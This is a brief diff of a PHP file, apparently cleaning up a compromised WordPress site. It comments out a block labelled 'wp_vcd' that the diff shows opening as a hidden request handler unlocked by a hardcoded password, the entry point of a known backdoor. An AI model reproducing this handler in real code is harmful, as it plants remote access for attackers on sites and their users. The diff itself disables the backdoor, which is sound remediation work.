@@ -1,5 +1,5 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e6bafebd876adb165d3d2e6651bb30e5'))
+/*if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e6bafebd876adb165d3d2e6651bb30e5'))
 {
 	$div_code_name="wp_vcd";
 	switch ($_REQUEST['action'])
@@ -54,7 +54,7 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 	die("");
 }
 
-
+*/
 
 
 
